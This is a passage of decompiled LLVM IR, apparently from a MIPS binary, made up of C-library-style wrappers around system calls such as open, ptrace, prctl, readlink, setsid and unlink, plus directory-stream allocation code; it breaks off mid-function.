define i32 @function_404cf0(i8* %arg1) local_unnamed_addr {
dec_label_pc_404cf0:
  %s0.global-to-local = alloca i32, align 4
  %v0_404d0c = load i32, i32* @a1, align 4
  %v1_404d0c = and i32 %v0_404d0c, 256
  %v1_404d18 = icmp eq i32 %v1_404d0c, 0
  br i1 %v1_404d18, label %dec_label_pc_404d2c, label %dec_label_pc_404d1c

dec_label_pc_404d1c:                              ; preds = %dec_label_pc_404cf0
  br label %dec_label_pc_404d2c

dec_label_pc_404d2c:                              ; preds = %dec_label_pc_404cf0, %dec_label_pc_404d1c
  %v4_404d34 = call i32 (i8*, i32, ...) @open(i8* %arg1, i32 %v0_404d0c)
  %v3_404d38 = load i32, i32* @global_var_4492e0.262, align 4
  store i32 %v3_404d38, i32* @t9, align 4
  %v0_404d3c = load i32, i32* @a3, align 4
  %v1_404d3c = icmp eq i32 %v0_404d3c, 0
  store i32 %v4_404d34, i32* %s0.global-to-local, align 4
  br i1 %v1_404d3c, label %dec_label_pc_404d58, label %dec_label_pc_404d40

dec_label_pc_404d40:                              ; preds = %dec_label_pc_404d2c
  %v1_404d44 = call i32 @function_4055d0()
  %v0_404d50 = load i32, i32* %s0.global-to-local, align 4
  %v2_404d50 = inttoptr i32 %v1_404d44 to i32*
  store i32 %v0_404d50, i32* %v2_404d50, align 4
  store i32 -1, i32* %s0.global-to-local, align 4
  br label %dec_label_pc_404d58

dec_label_pc_404d58:                              ; preds = %dec_label_pc_404d2c, %dec_label_pc_404d40
  %v0_404d58 = phi i32 [ %v4_404d34, %dec_label_pc_404d2c ], [ -1, %dec_label_pc_404d40 ]
  ret i32 %v0_404d58

; uselistorder directives
  uselistorder label %dec_label_pc_404d58, { 1, 0 }
  uselistorder label %dec_label_pc_404d2c, { 1, 0 }
}

define i32 @function_404d6c(i32 %arg1) local_unnamed_addr {
dec_label_pc_404d6c:
  %v3_404d78 = load i32, i32* @global_var_4491f4.304, align 4
  store i32 %v3_404d78, i32* @t9, align 4
  store i32 %arg1, i32* @a2, align 4
  store i32 769, i32* @a1, align 4
  %v3_404d80 = call i32 @function_404cf0(i8* inttoptr (i32 769 to i8*))
  ret i32 %v3_404d80
}

define i32 @function_404d90(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_404d90:
  %s0.global-to-local = alloca i32, align 4
  %v0.global-to-local = alloca i32, align 4
  store i32 4192, i32* %v0.global-to-local, align 4
  %v2_404dc8 = load i32, i32* @a2, align 4
  %v3_404dc8 = load i32, i32* @a3, align 4
  %v4_404dc8 = call i32 @prctl(i32 %arg1, i32 %arg2, i32 %v2_404dc8, i32 %v3_404dc8, i32 0)
  store i32 %v4_404dc8, i32* %v0.global-to-local, align 4
  %v3_404dd0 = load i32, i32* @global_var_4492e0.262, align 4
  %v0_404dd4 = load i32, i32* @a3, align 4
  %v1_404dd4 = icmp eq i32 %v0_404dd4, 0
  store i32 %v4_404dc8, i32* %s0.global-to-local, align 4
  br i1 %v1_404dd4, label %dec_label_pc_404df0, label %dec_label_pc_404dd8

dec_label_pc_404dd8:                              ; preds = %dec_label_pc_404d90
  call void @__pseudo_call(i32 %v3_404dd0)
  %v0_404de8 = load i32, i32* %s0.global-to-local, align 4
  %v1_404de8 = load i32, i32* %v0.global-to-local, align 4
  %v2_404de8 = inttoptr i32 %v1_404de8 to i32*
  store i32 %v0_404de8, i32* %v2_404de8, align 4
  store i32 -1, i32* %v0.global-to-local, align 4
  br label %dec_label_pc_404df0

dec_label_pc_404df0:                              ; preds = %dec_label_pc_404d90, %dec_label_pc_404dd8
  %v4_404e00 = phi i32 [ %v4_404dc8, %dec_label_pc_404d90 ], [ -1, %dec_label_pc_404dd8 ]
  ret i32 %v4_404e00

; uselistorder directives
  uselistorder i32* %v0.global-to-local, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_404df0, { 1, 0 }
}

define i32 @function_404e10(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_404e10:
  %s0.global-to-local = alloca i32, align 4
  %s1.global-to-local = alloca i32, align 4
  %v0.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v1_404e30 = add i32 %arg1, -1
  %v1_404e38 = icmp ult i32 %v1_404e30, 3
  store i32 %arg1, i32* %s1.global-to-local, align 4
  %v1_404e50 = icmp eq i1 %v1_404e38, false
  %v2_404e58 = ptrtoint i32* %stack_var_-24 to i32
  %v0_404e44.v2_404e58 = select i1 %v1_404e50, i32 %arg4, i32 %v2_404e58
  store i32 %v0_404e44.v2_404e58, i32* @a3, align 4
  store i32 4026, i32* %v0.global-to-local, align 4
  %v1_404e64 = call i32 (i32, ...) @ptrace(i32 %arg1)
  store i32 %v1_404e64, i32* %v0.global-to-local, align 4
  %v3_404e68 = load i32, i32* @global_var_4492e0.262, align 4
  store i32 %v3_404e68, i32* @t9, align 4
  %v0_404e6c = load i32, i32* @a3, align 4
  %v1_404e6c = icmp eq i32 %v0_404e6c, 0
  store i32 %v1_404e64, i32* %s0.global-to-local, align 4
  br i1 %v1_404e6c, label %dec_label_pc_404e8c, label %dec_label_pc_404e70

dec_label_pc_404e70:                              ; preds = %dec_label_pc_404e10
  %v1_404e74 = call i32 @function_4055d0()
  store i32 %v1_404e74, i32* %v0.global-to-local, align 4
  %v0_404e80 = load i32, i32* %s0.global-to-local, align 4
  %v2_404e80 = inttoptr i32 %v1_404e74 to i32*
  store i32 %v0_404e80, i32* %v2_404e80, align 4
  store i32 -1, i32* %s0.global-to-local, align 4
  %v0_404e8c.pre = load i32, i32* %v0.global-to-local, align 4
  br label %dec_label_pc_404e8c

dec_label_pc_404e8c:                              ; preds = %dec_label_pc_404e10, %dec_label_pc_404e70
  %v0_404e8c = phi i32 [ %v1_404e64, %dec_label_pc_404e10 ], [ %v0_404e8c.pre, %dec_label_pc_404e70 ]
  %v2_404ea0 = phi i32 [ %v1_404e64, %dec_label_pc_404e10 ], [ -1, %dec_label_pc_404e70 ]
  %v1_404e8c = icmp slt i32 %v0_404e8c, 0
  store i32 %v2_404ea0, i32* %v0.global-to-local, align 4
  br i1 %v1_404e8c, label %dec_label_pc_404ec4, label %dec_label_pc_404e90

dec_label_pc_404e90:                              ; preds = %dec_label_pc_404e8c
  %v0_404e94 = load i32, i32* %s1.global-to-local, align 4
  %v1_404e94 = icmp eq i32 %v0_404e94, 0
  %v3_404e94 = icmp ult i32 %v0_404e94, 4
  %v4_404e94 = zext i1 %v3_404e94 to i32
  store i32 %v4_404e94, i32* %v0.global-to-local, align 4
  br i1 %v1_404e94, label %dec_label_pc_404ec0, label %dec_label_pc_404e98

dec_label_pc_404e98:                              ; preds = %dec_label_pc_404e90
  %v3_404e9c = load i32, i32* @global_var_4492e0.262, align 4
  store i32 %v3_404e9c, i32* @t9, align 4
  %v1_404ea0 = icmp eq i1 %v3_404e94, false
  store i32 %v2_404ea0, i32* %v0.global-to-local, align 4
  br i1 %v1_404ea0, label %dec_label_pc_404ec4, label %dec_label_pc_404ea4

dec_label_pc_404ea4:                              ; preds = %dec_label_pc_404e98
  %v1_404ea8 = call i32 @function_4055d0()
  store i32 %v1_404ea8, i32* %v0.global-to-local, align 4
  %v1_404eb4 = inttoptr i32 %v1_404ea8 to i32*
  store i32 0, i32* %v1_404eb4, align 4
  %v3_404eb8 = load i32, i32* %stack_var_-24, align 4
  store i32 %v3_404eb8, i32* %s0.global-to-local, align 4
  br label %dec_label_pc_404ec0

dec_label_pc_404ec0:                              ; preds = %dec_label_pc_404e90, %dec_label_pc_404ea4
  %v0_404ec0 = phi i32 [ %v2_404ea0, %dec_label_pc_404e90 ], [ %v3_404eb8, %dec_label_pc_404ea4 ]
  store i32 %v0_404ec0, i32* %v0.global-to-local, align 4
  br label %dec_label_pc_404ec4

dec_label_pc_404ec4:                              ; preds = %dec_label_pc_404e98, %dec_label_pc_404e8c, %dec_label_pc_404ec0
  %v4_404ed0 = phi i32 [ %v2_404ea0, %dec_label_pc_404e98 ], [ %v2_404ea0, %dec_label_pc_404e8c ], [ %v0_404ec0, %dec_label_pc_404ec0 ]
  ret i32 %v4_404ed0

; uselistorder directives
  uselistorder i32* %v0.global-to-local, { 3, 7, 5, 4, 6, 0, 1, 2, 8 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_404ec4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_404ec0, { 1, 0 }
  uselistorder label %dec_label_pc_404e8c, { 1, 0 }
}

define i32 @function_404ee0(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_404ee0:
  %s0.global-to-local = alloca i32, align 4
  %v4_404f00 = call i32 @read(i32 %arg1, i32* %arg2, i32 %arg3)
  %v3_404f04 = load i32, i32* @global_var_4492e0.262, align 4
  store i32 %v3_404f04, i32* @t9, align 4
  %v0_404f08 = load i32, i32* @a3, align 4
  %v1_404f08 = icmp eq i32 %v0_404f08, 0
  store i32 %v4_404f00, i32* %s0.global-to-local, align 4
  br i1 %v1_404f08, label %dec_label_pc_404f24, label %dec_label_pc_404f0c

dec_label_pc_404f0c:                              ; preds = %dec_label_pc_404ee0
  %v1_404f10 = call i32 @function_4055d0()
  %v0_404f1c = load i32, i32* %s0.global-to-local, align 4
  %v2_404f1c = inttoptr i32 %v1_404f10 to i32*
  store i32 %v0_404f1c, i32* %v2_404f1c, align 4
  br label %dec_label_pc_404f24

dec_label_pc_404f24:                              ; preds = %dec_label_pc_404ee0, %dec_label_pc_404f0c
  %v4_404f2c = phi i32 [ %v4_404f00, %dec_label_pc_404ee0 ], [ -1, %dec_label_pc_404f0c ]
  ret i32 %v4_404f2c

; uselistorder directives
  uselistorder label %dec_label_pc_404f24, { 1, 0 }
}

define i32 @function_404f40(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_404f40:
  %s0.global-to-local = alloca i32, align 4
  %tmp = inttoptr i32 %arg2 to i8*
  %v7_404f60 = call i32 @readlink(i8* %arg1, i8* %tmp, i32 %arg3)
  %v3_404f64 = load i32, i32* @global_var_4492e0.262, align 4
  store i32 %v3_404f64, i32* @t9, align 4
  %v1_404f68 = icmp eq i32 %arg4, 0
  store i32 %v7_404f60, i32* %s0.global-to-local, align 4
  br i1 %v1_404f68, label %dec_label_pc_404f84, label %dec_label_pc_404f6c

dec_label_pc_404f6c:                              ; preds = %dec_label_pc_404f40
  %v1_404f70 = call i32 @function_4055d0()
  %v0_404f7c = load i32, i32* %s0.global-to-local, align 4
  %v2_404f7c = inttoptr i32 %v1_404f70 to i32*
  store i32 %v0_404f7c, i32* %v2_404f7c, align 4
  br label %dec_label_pc_404f84

dec_label_pc_404f84:                              ; preds = %dec_label_pc_404f40, %dec_label_pc_404f6c
  %v4_404f8c = phi i32 [ %v7_404f60, %dec_label_pc_404f40 ], [ -1, %dec_label_pc_404f6c ]
  ret i32 %v4_404f8c

; uselistorder directives
  uselistorder label %dec_label_pc_404f84, { 1, 0 }
}

define i32 @function_404fa0(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_404fa0:
  %s0.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @a3, align 4
  %v3_404fe0 = load i32, i32* @global_var_4492e0.262, align 4
  store i32 %v3_404fe0, i32* @t9, align 4
  %v1_404fe4 = icmp eq i32 %arg1, 0
  store i32 4142, i32* %s0.global-to-local, align 4
  br i1 %v1_404fe4, label %dec_label_pc_405000, label %dec_label_pc_404fe8

dec_label_pc_404fe8:                              ; preds = %dec_label_pc_404fa0
  %v1_404fec = call i32 @function_4055d0()
  %v0_404ff8 = load i32, i32* %s0.global-to-local, align 4
  %v2_404ff8 = inttoptr i32 %v1_404fec to i32*
  store i32 %v0_404ff8, i32* %v2_404ff8, align 4
  br label %dec_label_pc_405000

dec_label_pc_405000:                              ; preds = %dec_label_pc_404fa0, %dec_label_pc_404fe8
  %v4_405010 = phi i32 [ 4142, %dec_label_pc_404fa0 ], [ -1, %dec_label_pc_404fe8 ]
  ret i32 %v4_405010

; uselistorder directives
  uselistorder label %dec_label_pc_405000, { 1, 0 }
}

define i32 @function_405020() local_unnamed_addr {
dec_label_pc_405020:
  %s0.global-to-local = alloca i32, align 4
  %v0_405040 = call i32 @setsid()
  %v3_405044 = load i32, i32* @global_var_4492e0.262, align 4
  store i32 %v3_405044, i32* @t9, align 4
  %v0_405048 = load i32, i32* @a3, align 4
  %v1_405048 = icmp eq i32 %v0_405048, 0
  store i32 %v0_405040, i32* %s0.global-to-local, align 4
  br i1 %v1_405048, label %dec_label_pc_405064, label %dec_label_pc_40504c

dec_label_pc_40504c:                              ; preds = %dec_label_pc_405020
  %v1_405050 = call i32 @function_4055d0()
  %v0_40505c = load i32, i32* %s0.global-to-local, align 4
  %v2_40505c = inttoptr i32 %v1_405050 to i32*
  store i32 %v0_40505c, i32* %v2_40505c, align 4
  br label %dec_label_pc_405064

dec_label_pc_405064:                              ; preds = %dec_label_pc_405020, %dec_label_pc_40504c
  %v4_40506c = phi i32 [ %v0_405040, %dec_label_pc_405020 ], [ -1, %dec_label_pc_40504c ]
  ret i32 %v4_40506c

; uselistorder directives
  uselistorder label %dec_label_pc_405064, { 1, 0 }
}

define i32 @function_405080(%sysinfo* %arg1) local_unnamed_addr {
dec_label_pc_405080:
  %s0.global-to-local = alloca i32, align 4
  %v3_4050a0 = call i32 @sysinfo(%sysinfo* %arg1)
  %v3_4050a4 = load i32, i32* @global_var_4492e0.262, align 4
  store i32 %v3_4050a4, i32* @t9, align 4
  %v0_4050a8 = load i32, i32* @a3, align 4
  %v1_4050a8 = icmp eq i32 %v0_4050a8, 0
  store i32 %v3_4050a0, i32* %s0.global-to-local, align 4
  br i1 %v1_4050a8, label %dec_label_pc_4050c4, label %dec_label_pc_4050ac

dec_label_pc_4050ac:                              ; preds = %dec_label_pc_405080
  %v1_4050b0 = call i32 @function_4055d0()
  %v0_4050bc = load i32, i32* %s0.global-to-local, align 4
  %v2_4050bc = inttoptr i32 %v1_4050b0 to i32*
  store i32 %v0_4050bc, i32* %v2_4050bc, align 4
  br label %dec_label_pc_4050c4

dec_label_pc_4050c4:                              ; preds = %dec_label_pc_405080, %dec_label_pc_4050ac
  %v4_4050cc = phi i32 [ %v3_4050a0, %dec_label_pc_405080 ], [ -1, %dec_label_pc_4050ac ]
  ret i32 %v4_4050cc

; uselistorder directives
  uselistorder label %dec_label_pc_4050c4, { 1, 0 }
}

define i32 @function_4050e0(i32* %arg1) local_unnamed_addr {
dec_label_pc_4050e0:
  %s0.global-to-local = alloca i32, align 4
  %v2_405100 = call i32 @time(i32* %arg1)
  %v3_405104 = load i32, i32* @global_var_4492e0.262, align 4
  store i32 %v3_405104, i32* @t9, align 4
  %v0_405108 = load i32, i32* @a3, align 4
  %v1_405108 = icmp eq i32 %v0_405108, 0
  store i32 %v2_405100, i32* %s0.global-to-local, align 4
  br i1 %v1_405108, label %dec_label_pc_405124, label %dec_label_pc_40510c

dec_label_pc_40510c:                              ; preds = %dec_label_pc_4050e0
  %v1_405110 = call i32 @function_4055d0()
  %v0_40511c = load i32, i32* %s0.global-to-local, align 4
  %v2_40511c = inttoptr i32 %v1_405110 to i32*
  store i32 %v0_40511c, i32* %v2_40511c, align 4
  br label %dec_label_pc_405124

dec_label_pc_405124:                              ; preds = %dec_label_pc_4050e0, %dec_label_pc_40510c
  %v4_40512c = phi i32 [ %v2_405100, %dec_label_pc_4050e0 ], [ -1, %dec_label_pc_40510c ]
  ret i32 %v4_40512c

; uselistorder directives
  uselistorder label %dec_label_pc_405124, { 1, 0 }
}

define i32 @function_405140(i8* %arg1) local_unnamed_addr {
dec_label_pc_405140:
  %s0.global-to-local = alloca i32, align 4
  %v3_405160 = call i32 @unlink(i8* %arg1)
  %v3_405164 = load i32, i32* @global_var_4492e0.262, align 4
  store i32 %v3_405164, i32* @t9, align 4
  %v0_405168 = load i32, i32* @a3, align 4
  %v1_405168 = icmp eq i32 %v0_405168, 0
  store i32 %v3_405160, i32* %s0.global-to-local, align 4
  br i1 %v1_405168, label %dec_label_pc_405184, label %dec_label_pc_40516c

dec_label_pc_40516c:                              ; preds = %dec_label_pc_405140
  %v1_405170 = call i32 @function_4055d0()
  %v0_40517c = load i32, i32* %s0.global-to-local, align 4
  %v2_40517c = inttoptr i32 %v1_405170 to i32*
  store i32 %v0_40517c, i32* %v2_40517c, align 4
  br label %dec_label_pc_405184

dec_label_pc_405184:                              ; preds = %dec_label_pc_405140, %dec_label_pc_40516c
  %v4_40518c = phi i32 [ %v3_405160, %dec_label_pc_405140 ], [ -1, %dec_label_pc_40516c ]
  ret i32 %v4_40518c

; uselistorder directives
  uselistorder label %dec_label_pc_405184, { 1, 0 }
}

define i32 @function_4051a0(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_4051a0:
  %s0.global-to-local = alloca i32, align 4
  %v4_4051c0 = call i32 @write(i32 %arg1, i32* %arg2, i32 %arg3)
  %v3_4051c4 = load i32, i32* @global_var_4492e0.262, align 4
  store i32 %v3_4051c4, i32* @t9, align 4
  %v0_4051c8 = load i32, i32* @a3, align 4
  %v1_4051c8 = icmp eq i32 %v0_4051c8, 0
  store i32 %v4_4051c0, i32* %s0.global-to-local, align 4
  br i1 %v1_4051c8, label %dec_label_pc_4051e4, label %dec_label_pc_4051cc

dec_label_pc_4051cc:                              ; preds = %dec_label_pc_4051a0
  %v1_4051d0 = call i32 @function_4055d0()
  %v0_4051dc = load i32, i32* %s0.global-to-local, align 4
  %v2_4051dc = inttoptr i32 %v1_4051d0 to i32*
  store i32 %v0_4051dc, i32* %v2_4051dc, align 4
  br label %dec_label_pc_4051e4

dec_label_pc_4051e4:                              ; preds = %dec_label_pc_4051a0, %dec_label_pc_4051cc
  %v4_4051ec = phi i32 [ %v4_4051c0, %dec_label_pc_4051a0 ], [ -1, %dec_label_pc_4051cc ]
  ret i32 %v4_4051ec

; uselistorder directives
  uselistorder label %dec_label_pc_4051e4, { 1, 0 }
}

define i32 @function_405200(i32* %arg1) local_unnamed_addr {
dec_label_pc_405200:
  %s0.global-to-local = alloca i32, align 4
  %v1.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-40 = alloca i32, align 4
  %v0_405220 = load i32, i32* @s0, align 4
  store i32 %tmp, i32* @s1, align 4
  %v2_405230 = load i32, i32* %arg1, align 4
  %v1_405234 = add i32 %tmp, 24
  store i32 %v1_405234, i32* %s0.global-to-local, align 4
  %v2_405238 = ptrtoint i32* %stack_var_-40 to i32
  store i32 -1, i32* @s2, align 4
  store i32 ptrtoint (i32* @global_var_40688c.306 to i32), i32* %v1.global-to-local, align 4
  %v3_40524c = load i32, i32* @global_var_4492e0.262, align 4
  store i32 %v3_40524c, i32* @t9, align 4
  %v2_405250 = icmp eq i32 %v2_405230, -1
  br i1 %v2_405250, label %dec_label_pc_405254, label %dec_label_pc_405274

dec_label_pc_405254:                              ; preds = %dec_label_pc_405200
  %v1_405258 = call i32 @function_4055d0()
  store i32 9, i32* %v1.global-to-local, align 4
  %v2_405270 = inttoptr i32 %v1_405258 to i32*
  store i32 9, i32* %v2_405270, align 4
  %v0_405274.pre = load i32, i32* %v1.global-to-local, align 4
  br label %dec_label_pc_405274

dec_label_pc_405274:                              ; preds = %dec_label_pc_405200, %dec_label_pc_405254
  %v0_405274 = phi i32 [ ptrtoint (i32* @global_var_40688c.306 to i32), %dec_label_pc_405200 ], [ %v0_405274.pre, %dec_label_pc_405254 ]
  store i32 ptrtoint (i32* @global_var_405280.309 to i32), i32* @ra, align 4
  call void @__pseudo_call(i32 %v0_405274)
  %v1_405290 = load i32, i32* %s0.global-to-local, align 4
  %v3_405290 = call i32 @function_406884(i32 %v1_405290)
  store i32 %v3_405290, i32* @v0, align 4
  %v0_4052a4 = load i32, i32* @s1, align 4
  %v1_4052a4 = inttoptr i32 %v0_4052a4 to i32*
  %v2_4052a4 = load i32, i32* %v1_4052a4, align 4
  store i32 %v2_4052a4, i32* @s0, align 4
  %v1_4052ac = load i32, i32* @s2, align 4
  store i32 %v1_4052ac, i32* %v1_4052a4, align 4
  %v6_4052ac = call i32 @function_40688c(i32 %v2_405238, i32 1)
  %v0_4052b8 = load i32, i32* @s1, align 4
  %v1_4052b8 = add i32 %v0_4052b8, 12
  %v2_4052b8 = inttoptr i32 %v1_4052b8 to i32*
  %v3_4052b8 = load i32, i32* %v2_4052b8, align 4
  %v3_4052bc = load i32, i32* @global_var_449284.12, align 4
  store i32 %v3_4052bc, i32* @t9, align 4
  %v2_4052c4 = call i32 @function_406080(i32 %v3_4052b8)
  %v3_4052d4 = load i32, i32* @global_var_449284.12, align 4
  store i32 %v3_4052d4, i32* @t9, align 4
  %v1_4052dc = load i32, i32* @s1, align 4
  %v3_4052dc = call i32 @function_406080(i32 %v1_4052dc)
  %v3_4052ec = load i32, i32* @global_var_4491f8.312, align 4
  store i32 %v3_4052ec, i32* @t9, align 4
  %v1_4052f4 = load i32, i32* @s0, align 4
  %v3_4052f4 = call i32 @function_404b10(i32 %v1_4052f4)
  store i32 %v0_405220, i32* %s0.global-to-local, align 4
  ret i32 %v3_4052f4

; uselistorder directives
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32 9, { 2, 7, 3, 4, 8, 5, 9, 10, 1, 11, 12, 0, 13, 6, 14 }
  uselistorder label %dec_label_pc_405274, { 1, 0 }
}

define i32 @function_405330() local_unnamed_addr {
dec_label_pc_405330:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-168 = alloca i32, align 4
  %v3_405354 = load i32, i32* @global_var_4491f4.304, align 4
  store i32 %v3_405354, i32* @t9, align 4
  store i32 65664, i32* @a1, align 4
  %v5_40535c = call i32 @function_404cf0(i8* inttoptr (i32 65664 to i8*))
  %v1_405368 = icmp sgt i32 %v5_40535c, -1
  store i32 %v5_40535c, i32* @s0, align 4
  br i1 %v1_405368, label %dec_label_pc_405378, label %dec_label_pc_40536c

dec_label_pc_40536c:                              ; preds = %dec_label_pc_405330
  br label %dec_label_pc_405378

dec_label_pc_405378:                              ; preds = %dec_label_pc_405330, %dec_label_pc_40536c
  %v3_405378 = load i32, i32* @global_var_4492f0.313, align 4
  store i32 %v3_405378, i32* @t9, align 4
  %v3_405380 = ptrtoint i32* %stack_var_-168 to i32
  %v6_405380 = call i32 @function_406eb0(i32 %v5_40535c, i32 %v3_405380)
  %v1_40538c = icmp slt i32 %v6_405380, 0
  %v2_40538c = load i32, i32* @s0, align 4
  store i32 %v2_40538c, i32* @a0, align 4
  br i1 %v1_40538c, label %dec_label_pc_4053b0, label %dec_label_pc_405390

dec_label_pc_405390:                              ; preds = %dec_label_pc_405378
  %v3_405394 = load i32, i32* @global_var_4491fc.314, align 4
  store i32 %v3_405394, i32* @t9, align 4
  store i32 2, i32* @a1, align 4
  %v1_40539c = call i32 @function_4049b0()
  %v1_4053a8 = icmp sgt i32 %v1_40539c, -1
  br i1 %v1_4053a8, label %dec_label_pc_4053e4, label %dec_label_pc_4053b0

dec_label_pc_4053b0:                              ; preds = %dec_label_pc_405390, %dec_label_pc_405378
  %v3_4053b0 = load i32, i32* @global_var_4492e0.262, align 4
  store i32 %v3_4053b0, i32* @t9, align 4
  %v1_4053b8 = call i32 @function_4055d0()
  %v0_4053c4 = load i32, i32* @s0, align 4
  %v3_4053c8 = load i32, i32* @global_var_4491f8.312, align 4
  store i32 %v3_4053c8, i32* @t9, align 4
  %v1_4053cc = inttoptr i32 %v1_4053b8 to i32*
  %v2_4053cc = load i32, i32* %v1_4053cc, align 4
  store i32 %v2_4053cc, i32* @s0, align 4
  store i32 %v1_4053b8, i32* @s1, align 4
  %v3_4053d0 = call i32 @function_404b10(i32 %v0_4053c4)
  %v0_4053e0 = load i32, i32* @s0, align 4
  %v1_4053e0 = load i32, i32* @s1, align 4
  %v2_4053e0 = inttoptr i32 %v1_4053e0 to i32*
  store i32 %v0_4053e0, i32* %v2_4053e0, align 4
  br label %dec_label_pc_4053e4

dec_label_pc_4053e4:                              ; preds = %dec_label_pc_405390, %dec_label_pc_4053b0
  %v3_4053e4 = load i32, i32* @global_var_449458.24, align 4
  store i32 %v3_4053e4, i32* @t9, align 4
  %v2_4053ec = call i32 @function_405dd0(i32 48)
  %v1_4053f8 = icmp eq i32 %v2_4053ec, 0
  store i32 %v2_4053ec, i32* @s2, align 4
  br i1 %v1_4053f8, label %dec_label_pc_405460, label %dec_label_pc_4053fc

dec_label_pc_4053fc:                              ; preds = %dec_label_pc_4053e4
  %v0_405400 = load i32, i32* @s0, align 4
  %v2_405400 = inttoptr i32 %v2_4053ec to i32*
  store i32 %v0_405400, i32* %v2_405400, align 4
  %v1_405404 = add i32 %v2_4053ec, 16
  %v2_405404 = inttoptr i32 %v1_405404 to i32*
  store i32 0, i32* %v2_405404, align 4
  %v1_405408 = add i32 %v2_4053ec, 8
  %v2_405408 = inttoptr i32 %v1_405408 to i32*
  store i32 0, i32* %v2_405408, align 4
  %v1_40540c = add i32 %v2_4053ec, 4
  %v2_40540c = inttoptr i32 %v1_40540c to i32*
  store i32 0, i32* %v2_40540c, align 4
  store i32 %tmp, i32* @v0, align 4
  %v1_405418 = icmp ult i32 %tmp, 512
  %v1_40541c = icmp eq i1 %v1_405418, false
  %v3_40541c = load i32, i32* @s2, align 4
  %v4_40541c = add i32 %v3_40541c, 20
  %v5_40541c = inttoptr i32 %v4_40541c to i32*
  store i32 %tmp, i32* %v5_40541c, align 4
  br i1 %v1_40541c, label %dec_label_pc_40542c, label %dec_label_pc_405420

dec_label_pc_405420:                              ; preds = %dec_label_pc_4053fc
  store i32 512, i32* @v0, align 4
  %v1_405428 = load i32, i32* @s2, align 4
  %v2_405428 = add i32 %v1_405428, 20
  %v3_405428 = inttoptr i32 %v2_405428 to i32*
  store i32 512, i32* %v3_405428, align 4
  br label %dec_label_pc_40542c

dec_label_pc_40542c:                              ; preds = %dec_label_pc_4053fc, %dec_label_pc_405420
  %v3_40542c = load i32, i32* @global_var_4493f0.14, align 4
  store i32 %v3_40542c, i32* @t9, align 4
  %v0_405430 = load i32, i32* @s2, align 4
  %v1_405430 = add i32 %v0_405430, 20
  %v2_405430 = inttoptr i32 %v1_405430 to i32*
  %v3_405430 = load i32, i32* %v2_405430, align 4
  %v4_405434 = call i32 @function_405fc0(i64 1, i32 %v3_405430)
  %v1_405440 = icmp eq i32 %v4_405434, 0
  %v3_405440 = load i32, i32* @s2, align 4
  %v4_405440 = add i32 %v3_405440, 12
  %v5_405440 = inttoptr i32 %v4_405440 to i32*
  store i32 %v4_405434, i32* %v5_405440, align 4
  br i1 %v1_405440, label %dec_label_pc_405444, label %dec_label_pc_405498

dec_label_pc_405444:                              ; preds = %dec_label_pc_40542c
  %v3_405448 = load i32, i32* @global_var_449284.12, align 4
  store i32 %v3_405448, i32* @t9, align 4
  %v1_405450 = load i32, i32* @s2, align 4
  %v3_405450 = call i32 @function_406080(i32 %v1_405450)
  br label %dec_label_pc_405460

dec_label_pc_405460:                              ; preds = %dec_label_pc_4053e4, %dec_label_pc_405444
  %v3_405460 = load i32, i32* @global_var_4491f8.312, align 4
  store i32 %v3_405460, i32* @t9, align 4
  %v1_405468 = load i32, i32* @s0, align 4
  %v3_405468 = call i32 @function_404b10(i32 %v1_405468)
  %v3_405478 = load i32, i32* @global_var_4492e0.262, align 4
  store i32 %v3_405478, i32* @t9, align 4
  store i32 0, i32* @s2, align 4
  %v1_405480 = call i32 @function_4055d0()
  %v2_405494 = inttoptr i32 %v1_405480 to i32*
  store i32 12, i32* %v2_405494, align 4
  br label %dec_label_pc_405498

dec_label_pc_405498:                              ; preds = %dec_label_pc_40542c, %dec_label_pc_405460
  %v0_40549c = load i32, i32* @s2, align 4
  %v1_40549c = add i32 %v0_40549c, 24
  %v2_4054a0 = call i32 @function_406884(i32 %v1_40549c)
  %v0_4054ac = load i32, i32* @s2, align 4
  ret i32 %v0_4054ac

; uselistorder directives
  uselistorder i32 %v2_4053ec, { 0, 3, 2, 1, 4, 5 }
  uselistorder i32 %v1_4053b8, { 1, 0 }
  uselistorder i32 %tmp, { 2, 1, 0 }
  uselistorder i32 (i32)* @function_406080, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i64, i32)* @function_405fc0, { 0, 2, 1 }
  uselistorder i32 512, { 0, 2, 3, 1, 4 }
  uselistorder i32 (i32)* @function_405dd0, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32)* @function_404b10, { 9, 8, 7, 6, 0, 5, 4, 3, 2, 1 }
  uselistorder label %dec_label_pc_405498, { 1, 0 }
  uselistorder label %dec_label_pc_405460, { 1, 0 }
  uselistorder label %dec_label_pc_40542c, { 1, 0 }
  uselistorder label %dec_label_pc_4053e4, { 1, 0 }
  uselistorder label %dec_label_pc_405378, { 1, 0 }
}

define i32 @function_4054d0(i32* %arg1) local_unnamed_addr {
dec_label_pc_4054d0:
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-32 = alloca i32, align 4
  %v1_4054f4 = add i32 %tmp, 24
  store i32 %v1_4054f4, i32* @s0, align 4
  store i32 %tmp, i32* @s1, align 4
  %v3_405504 = ptrtoint i32* %stack_var_-32 to i32
  %v6_405504 = call i32 @function_40688c(i32 %v3_405504, i32 ptrtoint (i32* @global_var_406884.308 to i32))
  %v1_40551c = load i32, i32* @s0, align 4
  %v3_40551c = call i32 @function_406884(i32 %v1_40551c)
  br label %dec_label_pc_405528

dec_label_pc_405528:                              ; preds = %dec_label_pc_405568, %dec_label_pc_4054d0
  %v0_405528 = load i32, i32* @s1, align 4
  %v1_405528 = add i32 %v0_405528, 4
